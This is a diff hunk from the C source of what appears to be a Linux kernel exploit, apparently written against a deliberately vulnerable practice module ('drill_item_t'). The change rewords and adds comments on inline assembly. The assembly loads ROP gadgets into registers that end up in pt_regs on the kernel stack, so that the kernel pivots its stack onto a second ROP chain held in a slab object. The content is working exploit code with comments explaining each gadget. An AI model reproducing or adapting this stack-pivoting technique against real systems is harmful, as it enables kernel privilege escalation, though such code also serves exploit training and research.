@@ -167,20 +167,23 @@ int act(int act_fd, int code, int n, char *args)
 
 	/*
 	 * Let's place the ROP chain #1 in the pt_regs that reside at the end
-	 * (i.e. top) of the kernel stack. These gadgets calculate the address
-	 * of the ROP chain #2 inside the drill_item_t object (allocated in slab)
-	 * and perform stack pivoting onto it.
+	 * (i.e. top) of the kernel stack. See the order of pt_regs registers in
+	 * arch/x86/include/asm/ptrace.h.
+	 *
+	 * These gadgets calculate the address of the ROP chain #2 inside the
+	 * drill_item_t object (allocated in slab) and perform stack pivoting onto it.
 	 */
-	__asm__ __volatile__(".intel_syntax noprefix\n\t"
+	__asm__ __volatile__(
+		".intel_syntax noprefix\n\t"
 		"mov r14, " STR(POP_RAX) "\n\t"
-		"mov r13, 0x00000000000001e0\n\t" /* value for rax */
-		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t"
-		/* hole => dummy rbx */
-		"mov rbx, " STR(POP_R15) "\n\t"
-		/* hole => dummyy r15 */
-		"mov r10, " STR(SUB_RSI_RAX) "\n\t"
-		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t"
-		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t"
+		"mov r13, 0x00000000000001e0\n\t" /* put this value into rax */
+		"mov r12, " STR(PUSH_RSP_POP_RSI_POP_RBX) "\n\t" /* put the stack pointer into rsi */
+		/* rbp in pt_regs stores a dummy value for "pop rbx" above */
+		"mov rbx, " STR(POP_R15) "\n\t" /* move the uncontrolled r11 value to r15, for example */
+		/* r11 in pt_regs stores eflags, when SYSRET is used to exit to userspace */
+		"mov r10, " STR(SUB_RSI_RAX) "\n\t" /* get the address of the drill_item_t address in stack */
+		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t" /* put the drill_item_t address into rax */
+		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t" /* do stack pivoting into drill_item_t.data */
 		".att_syntax prefix");
 
 	/* Now perform the syscall with the crafted values in the registers */
